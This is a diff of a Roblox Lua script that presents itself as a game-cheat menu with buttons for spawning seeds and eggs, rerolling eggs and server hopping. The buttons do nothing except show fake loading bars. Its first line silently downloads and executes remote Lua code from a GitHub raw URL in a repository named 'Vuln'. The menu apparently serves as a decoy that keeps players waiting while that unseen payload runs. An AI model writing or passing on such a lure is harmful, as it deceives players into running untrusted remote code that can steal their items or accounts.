@@ -1,46 +1,112 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/Vuln.0.25/refs/heads/main/MercenariesUpdatev3.lua"))()
 
--- Create the GUI
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+-- Utility: Clear any previous GUI
+if playerGui:FindFirstChild("CustomUI") then
+    playerGui.CustomUI:Destroy()
+end
+
+-- Main GUI
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "EndlessLoading"
+screenGui.Name = "CustomUI"
 screenGui.ResetOnSpawn = false
 screenGui.Parent = playerGui
 
 -- Background
 local background = Instance.new("Frame")
 background.Size = UDim2.new(1, 0, 1, 0)
-background.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 background.BorderSizePixel = 0
 background.Parent = screenGui
 
--- Spinner
-local spinner = Instance.new("ImageLabel")
-spinner.Size = UDim2.new(0, 100, 0, 100)
-spinner.Position = UDim2.new(0.5, -50, 0.5, -50)
-spinner.BackgroundTransparency = 1
-spinner.Image = "rbxassetid://7733960981" -- Replace with a spinner icon
-spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
-spinner.Parent = background
+-- Loading bar container
+local loadingBarBg = Instance.new("Frame")
+loadingBarBg.Size = UDim2.new(0.6, 0, 0.05, 0)
+loadingBarBg.Position = UDim2.new(0.2, 0, 0.5, 0)
+loadingBarBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+loadingBarBg.BorderSizePixel = 0
+loadingBarBg.Parent = background
 
--- Optional: Loading Text
-local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(1, 0, 0, 50)
-loadingText.Position = UDim2.new(0, 0, 0.65, 0)
-loadingText.Text = "Loading..."
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadingText.TextTransparency = 0.1
-loadingText.BackgroundTransparency = 1
-loadingText.Font = Enum.Font.GothamSemibold
-loadingText.TextSize = 24
-loadingText.Parent = background
+local loadingBar = Instance.new("Frame")
+loadingBar.Size = UDim2.new(0, 0, 1, 0)
+loadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+loadingBar.BorderSizePixel = 0
+loadingBar.Parent = loadingBarBg
 
--- Rotation loop (endless)
-task.spawn(function()
-    while true do
-        spinner.Rotation += 2
-        task.wait(0.01)
+-- Tween loading bar (5s)
+local TweenService = game:GetService("TweenService")
+local loadingTween = TweenService:Create(loadingBar, TweenInfo.new(5), {
+    Size = UDim2.new(1, 0, 1, 0)
+})
+loadingTween:Play()
+
+-- Wait for bar to fill
+loadingTween.Completed:Wait()
+
+-- Remove loading bar
+loadingBarBg:Destroy()
+
+-- Create menu buttons
+local buttonNames = {
+    "Server Hop",
+    "Pet and fruit (beta)",
+    "Spawn seed and egg",
+    "Egg reroll (unpatched)"
+}
+
+local buttons = {}
+
+for i, name in ipairs(buttonNames) do
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0.6, 0, 0.08, 0)
+    button.Position = UDim2.new(0.2, 0, 0.2 + (i - 1) * 0.12, 0)
+    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.Text = name
+    button.Font = Enum.Font.GothamBold
+    button.TextSize = 20
+    button.AutoButtonColor = true
+    button.Parent = background
+    buttons[#buttons + 1] = button
+end
+
+-- Function to handle click and show 30-second loading
+local function onButtonClick(button)
+    -- Remove all buttons
+    for _, btn in pairs(buttons) do
+        btn:Destroy()
     end
-end)
+
+    -- Create 30s loading bar
+    local loadingBarLongBg = Instance.new("Frame")
+    loadingBarLongBg.Size = UDim2.new(0.6, 0, 0.05, 0)
+    loadingBarLongBg.Position = UDim2.new(0.2, 0, 0.5, 0)
+    loadingBarLongBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    loadingBarLongBg.BorderSizePixel = 0
+    loadingBarLongBg.Parent = background
+
+    local loadingBarLong = Instance.new("Frame")
+    loadingBarLong.Size = UDim2.new(0, 0, 1, 0)
+    loadingBarLong.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
+    loadingBarLong.BorderSizePixel = 0
+    loadingBarLong.Parent = loadingBarLongBg
+
+    local loadingTweenLong = TweenService:Create(loadingBarLong, TweenInfo.new(30), {
+        Size = UDim2.new(1, 0, 1, 0)
+    })
+    loadingTweenLong:Play()
+
+    loadingTweenLong.Completed:Wait()
+
+    -- Done: You can call the next script or action here
+    background:Destroy()
+end
+
+-- Connect buttons
+for _, button in pairs(buttons) do
+    button.MouseButton1Click:Connect(function()
+        onButtonClick(button)
+    end)
+end
